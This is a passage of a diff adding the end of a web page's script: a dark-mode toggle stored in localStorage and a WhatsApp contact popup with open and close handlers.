+  const themeIcon = themeToggle.querySelector('i');
+
+  const savedTheme =
+    localStorage.getItem('ckmr-theme');
+
+  if (savedTheme === 'dark') {
+    document.body.classList.add('dark-mode');
+    themeIcon.className = 'fa-solid fa-sun';
+  }
+
+  themeToggle.addEventListener('click', function() {
+
+    document.body.classList.toggle('dark-mode');
+
+    const dark =
+      document.body.classList.contains('dark-mode');
+
+    localStorage.setItem(
+      'ckmr-theme',
+      dark ? 'dark' : 'light'
+    );
+
+    themeIcon.className =
+      dark
+        ? 'fa-solid fa-sun'
+        : 'fa-solid fa-moon';
+  });
+
+  /* ================= WHATSAPP ================= */
+
+  const waBtn = $('waBtn');
+  const waPopup = $('waPopup');
+
+  waBtn.addEventListener('click', function(e) {
+    e.stopPropagation();
+    waPopup.classList.toggle('open');
+  });
+
+  document.addEventListener('click', function(e) {
+
+    if (
+      !waPopup.contains(e.target) &&
+      e.target !== waBtn &&
+      !waBtn.contains(e.target)
+    ) {
+      waPopup.classList.remove('open');
+    }
+  });
+
+  document.querySelectorAll('.wa-item').forEach(item => {
+
+    item.addEventListener('click', function() {
+      waPopup.classList.remove('open');
+    });
+
+  });
+</script>
+
+</body>
+</html>
